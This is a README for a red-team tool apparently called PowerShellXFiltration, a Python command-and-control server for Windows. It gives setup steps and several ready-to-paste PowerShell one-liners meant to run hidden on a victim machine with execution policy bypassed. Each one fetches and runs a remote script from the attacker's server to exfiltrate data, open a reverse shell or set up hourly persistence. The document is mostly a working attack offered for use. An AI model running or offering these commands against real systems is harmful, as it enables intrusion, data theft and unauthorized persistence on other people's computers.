## PowerShellXFiltration
A Python web server to execute several actions on a Windows system, acting like a C2.
Useful for redteam.

### Example
1. Change the listening IP/Port in `server.py` (default is `0.0.0.0:8000`).
2. Change the IP/port of your Python server in `client_exf.ps1` (`<HOST>` and `<PORT>`).
3. Change the IP/port of your listener reverse-shell in `client_rvs.ps1` (`<HOST>` and `<PORT>`).
4. Change the `<BASE64_ENCODED_PAYLOAD>` for persistence in `client_pers.ps1` (encode with UTF-16LE).
5. Run:
```
ATTACKER> python3 server.py

#For data exfiltration
VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<SERVER-IP>:<SERVER-PORT>/client_exf');"

#For reverse-shell
VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<SERVER-IP>:<SERVER-PORT>/client_rvs');"

#For running a persistent command (by default runs every hour for 6 days, but can be changed in `client_pers.ps1`)
VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<SERVER-IP>:<SERVER-PORT>/client_pers');"

#For running data exfiltration + reverse-shell
VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<SERVER-IP>:<SERVER-PORT>/run_all');"
```
